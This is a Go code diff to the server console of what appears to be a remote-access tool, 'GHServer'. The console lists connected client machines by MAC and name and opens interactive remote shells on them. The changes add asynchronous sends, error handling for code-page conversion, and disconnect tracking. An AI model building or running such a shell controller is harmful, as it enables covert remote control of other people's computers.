@@ -151,7 +151,7 @@ func (s *GHServer) handleConn() {
 				conneted: true,
 			}
 			fmt.Printf("\n[*] Client %d online, MAC: %s, Name: %s\nCmd->", s.curCltID, s.pr.mac, s.pr.payload)
-			s.send(s.curCltID, TunnelConnServerResp, s.pr.payload)
+			go s.send(s.curCltID, TunnelConnServerResp, s.pr.payload)
 		}
 		break
 	case TunnelConnHeartBeat:
@@ -165,15 +165,24 @@ func (s *GHServer) handleConn() {
 func (s *GHServer) handleShell() {
 	switch s.pr.dataType {
 	case TunnelShellData:
-		cd, _ := iconv.Open("utf-8", s.curCltACP) // convert utf-8 to gbk
-		defer cd.Close()
+		cd, err := iconv.Open("utf-8", s.curCltACP) // convert utf-8 to gbk
+		if err != nil {
+			fmt.Println(err)
+			break
+		}
 
+		defer cd.Close()
 		ret := cd.ConvString(s.pr.payload)
+		if ret == "" {
+			fmt.Println("[!] convert to utf-8 error, show raw data")
+			fmt.Print(s.pr.payload)
+			break
+		}
 		fmt.Print(ret)
 		break
 
 	case TunnelShellACP:
-		fmt.Printf("[*] Shell from Client %d is ready\n", s.curOptCltID)
+		fmt.Printf("[*] Shell from Client %d is ready,\n", s.curOptCltID)
 		acp := []byte(s.pr.payload)
 
 		for i := len(acp)/2 - 1; i >= 0; i-- {
@@ -181,6 +190,7 @@ func (s *GHServer) handleShell() {
 			acp[i], acp[opp] = acp[opp], acp[i]
 		}
 		s.curCltACP = fmt.Sprintf("CP%d", binary.BigEndian.Uint32([]byte(string(acp))))
+		fmt.Println("[*] ACP", s.curCltACP)
 		break
 
 	default:
@@ -363,7 +373,9 @@ func (s *GHServer) showSessions() {
 	}
 	fmt.Println("ID           MAC                   Name		System")
 	for _, c := range s.clients {
-		fmt.Printf("%-2d    %-20s   %-10s       %s\n", c.id, c.mac, c.name, c.system)
+		if c.conneted {
+			fmt.Printf("%-2d    %-20s   %-10s       %s\n", c.id, c.mac, c.name, c.system)
+		}
 	}
 }
 
@@ -385,7 +397,7 @@ func (s *GHServer) interact(clientID uint8) {
 	}
 
 	s.curOptCltID = clientID
-	s.send(s.curOptCltID, TunnelShellInit, "")
+	go s.send(s.curOptCltID, TunnelShellInit, "")
 	go s.sendServerHeartBeat()
 
 	for {
@@ -393,10 +405,16 @@ func (s *GHServer) interact(clientID uint8) {
 		p, _, _ := stdin.ReadLine()
 		payload := string(p)
 		if payload == "quit" {
-			s.send(s.curOptCltID, TunnelShellQuit, "")
+			go s.send(s.curOptCltID, TunnelShellQuit, "")
+			for _, c := range s.clients {
+				if c.id == clientID {
+					c.conneted = false
+					break
+				}
+			}
 			return
 		}
-		s.send(s.curOptCltID, TunnelShellData, payload)
+		go s.send(s.curOptCltID, TunnelShellData, payload)
 	}
 }
 
